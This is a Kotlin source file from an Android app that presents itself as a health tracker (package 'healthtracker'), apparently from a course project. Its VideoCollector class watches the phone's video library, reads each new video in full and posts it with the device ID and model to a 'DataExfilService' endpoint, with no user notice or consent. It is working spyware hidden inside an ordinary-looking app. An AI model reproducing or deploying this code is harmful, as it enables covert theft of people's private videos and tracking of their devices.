package com.inf2007.healthtracker.utilities.collectors

import android.content.ContentUris
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class VideoCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "VideoCollector"
        private const val SCAN_DEBOUNCE_MS = 2000L
    }

    private var videoObserver: ContentObserver? = null
    private var lastScanTime = 0L

    private val videoSyncPrefs by lazy {
        context.getSharedPreferences("video_sync_log", Context.MODE_PRIVATE)
    }

    private val uploadingVideos = mutableSetOf<Long>()

    override fun startObserving() {
        // Initial scan
        scanAndUploadVideos()
        Log.d(TAG, "Video collector started")
    }

    override fun stopObserving() {
        Log.d(TAG, "Video collector stopped")
    }

    override fun collect() {
        scanAndUploadVideos()
    }

    fun setupObservers(contentResolver: android.content.ContentResolver) {
        videoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                val now = System.currentTimeMillis()
                if (now - lastScanTime > SCAN_DEBOUNCE_MS) {
                    Log.d(TAG, "Videos database changed: $uri")
                    lastScanTime = now
                    scanAndUploadVideos()
                } else {
                    Log.d(TAG, "Skipping rapid duplicate change event")
                }
            }
        }

        contentResolver.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            true,
            videoObserver!!
        )

        Log.d(TAG, "Video observer registered")
    }

    fun removeObservers(contentResolver: android.content.ContentResolver) {
        try {
            videoObserver?.let { contentResolver.unregisterContentObserver(it) }
            Log.d(TAG, "Video observer removed")
        } catch (e: Exception) {
            Log.e(TAG, "Error removing video observer: ${e.message}")
        }
    }

    private fun scanAndUploadVideos() {
        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATE_TAKEN,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.SIZE
        )

        context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Video.Media.DATE_TAKEN} DESC"
        )?.use { cursor ->
            val totalVideos = cursor.count
            Log.d(TAG, "Video Gallery Scan: $totalVideos videos found")

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val dateTakenColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN)
            val durationColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)
            val sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val fileName = cursor.getString(nameColumn)
                val dateTaken = cursor.getLong(dateTakenColumn)
                val duration = cursor.getLong(durationColumn)
                val size = cursor.getLong(sizeColumn)

                // Check if already uploaded OR currently uploading
                if (!videoSyncPrefs.getBoolean("video_$id", false) && !uploadingVideos.contains(id)) {
                    uploadingVideos.add(id)
                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                    uploadVideoToServer(contentUri, fileName, id, dateTaken, duration, size)
                    uploadCount++
                }
            }
            Log.d(TAG, "Video Scan Complete: $uploadCount new videos queued")
        }
    }

    private fun uploadVideoToServer(uri: Uri, fileName: String, videoId: Long, dateTaken: Long, duration: Long, size: Long) {
        try {
            val inputStream = context.contentResolver.openInputStream(uri)
            val bytes = inputStream?.readBytes() ?: return
            inputStream.close()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName,
                    bytes.toRequestBody("video/mp4".toMediaTypeOrNull()))
                .addFormDataPart("video_id", videoId.toString())
                .addFormDataPart("date_taken", dateTaken.toString())
                .addFormDataPart("duration", duration.toString())
                .addFormDataPart("file_size", size.toString())
                .addFormDataPart("device_id", getUniqueDeviceId())
                .addFormDataPart("device_model", android.os.Build.MODEL)
                .build()

            val request = Request.Builder()
                .url(DataExfilService.VIDEO_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Video upload failed: $fileName")
                    uploadingVideos.remove(videoId)  // Remove on failure
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Video uploaded: $fileName")
                        videoSyncPrefs.edit().putBoolean("video_$videoId", true).apply()
                    }
                    uploadingVideos.remove(videoId)  // Remove on success
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading video: ${e.message}")
            uploadingVideos.remove(videoId)
        }
    }

    private fun getUniqueDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }
}